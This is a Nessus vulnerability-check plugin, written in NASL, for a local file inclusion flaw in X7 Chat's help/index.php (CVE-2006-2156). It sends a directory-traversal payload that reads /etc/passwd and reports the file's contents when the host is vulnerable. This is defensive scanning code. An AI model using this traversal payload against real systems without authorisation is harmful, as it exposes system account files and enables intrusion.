#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21312);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-2156");
  script_bugtraq_id(17777);
  script_osvdb_id(25149);

  script_name(english:"X7 Chat help/index.php help_file Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file using X7 Chat");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running X7 Chat, a web-based chat program written
in PHP. 

The version of X7 Chat installed on the remote host fails to properly
sanitize input to the 'help_file' parameter of the 'help/index.php'
script before using it in a PHP 'include_once()' function.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit this issue to view arbitrary files or
to execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/May/27" );
 script_set_attribute(attribute:"see_also", value:"http://x7chat.com/support_forum/index.php/topic,2143.0.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to X7 Chat version 2.0.3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/02");
 script_cvs_date("$Date: 2016/11/01 19:59:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/x7chat", "/chat", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit a flaw to read the albums folder index.php.
  file = "../../../../../../../../../../../etc/passwd";
  u = string(
      dir, "/help/index.php?",
      "help_file=", file
    );
  r = http_send_recv3(method: "GET", port:port, item: u);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like X7 Chat and...
    "<title>X7 Chat Help Center" >< res &&
    # there's an entry for root
    egrep(pattern:"root:.*:0:[01]:", string:res)
  )
  {
    contents = res - strstr(res, "<br");

    report = string(
      "\n",
      "Here are the repeated contents of the file '/etc/passwd'\n",
      "that Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
